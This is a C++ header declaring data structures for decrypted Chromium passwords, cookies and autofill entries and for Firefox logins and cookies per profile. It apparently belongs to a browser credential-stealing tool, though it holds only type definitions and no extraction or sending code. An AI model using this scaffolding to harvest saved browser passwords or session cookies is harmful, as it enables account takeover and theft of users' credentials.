
#pragma once

#include <string>
#include <vector>
#include <botan/secmem.h>

#pragma comment (lib, "botan.lib")

namespace Core
{
    //CHROMIUM
    struct DecryptedAccount {
        bool success = false;
        std::vector<std::string> website;
        std::vector<std::string> username;
        std::vector<std::string> password;
    };
    struct DecryptedCookie {
        bool success = false;
        std::vector<std::string> hostkey;
        std::vector<std::string> httponly;
        std::vector<std::string> path;
        std::vector<std::string> secure;
        std::vector<int64_t> expires_utc;
        std::vector<std::string> name;
        std::vector<std::string> decrypted_value;
    };
    struct AutoFill {
        bool success = false;
        std::vector<std::string> name;
        std::vector<std::string> value;
    };

    //FIREFOX
    struct Logins
    {
        std::tuple<Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>> tuple_Username;
        std::tuple<Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>> tuple_Password;
        std::string hostname;
    };
    struct DecryptedLogins
    {
        std::string fireProfile;
        std::vector<std::string> hostname;
        std::vector<std::string> login;
        std::vector<std::string> password;
    };
    struct Cookies {
        std::string fireProfile;
        std::vector<std::string> hostkey;
        std::vector<std::string> httponly;
        std::vector<std::string> path;
        std::vector<std::string> secure;
        std::vector<int64_t> expires_utc;
        std::vector<std::string> name;
        std::vector<std::string> value;
    };

    //ADDITIONAL
    struct Credentials
    {
        std::string hostname;
        std::string login;
        std::string password;
    };
}